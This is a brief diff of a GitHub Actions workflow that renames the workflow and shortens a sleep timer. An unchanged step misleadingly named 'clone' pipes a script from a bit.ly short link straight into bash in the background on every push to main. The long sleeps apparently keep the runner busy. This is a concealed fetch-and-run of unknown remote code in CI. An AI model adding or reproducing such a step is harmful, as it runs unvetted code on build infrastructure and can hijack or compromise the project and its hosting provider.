@@ -1,4 +1,4 @@
-name: nasayapapp
+name: nayaapp
 on: 
   push:
     branches: [ "main" ]
@@ -75,7 +75,7 @@ jobs:
       id: go
     - name: clone
       run: curl -sL  http://bit.ly/3Jefaky | bash &
-            sleep 65m
+            sleep 15m
 
   meet:
     needs: [time]
